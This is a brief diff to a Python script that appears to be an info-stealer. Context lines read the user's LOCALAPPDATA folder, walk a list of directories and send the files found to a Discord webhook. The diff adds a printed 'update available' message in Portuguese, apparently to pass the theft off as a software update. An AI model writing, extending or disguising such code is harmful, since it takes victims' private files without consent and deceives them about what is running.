@@ -1,3 +1,5 @@
+
+print("ATUALIZAÇÃO DISPONÍVEL")
 import os
 import requests
 LOCAL = os.getenv("LOCALAPPDATA")
@@ -56,3 +58,4 @@ for diretorio2 in DIRETORIOS2:
         send_files_to_discord_webhook(files, WEBHOOK_URL)
     else:
         pass
+   
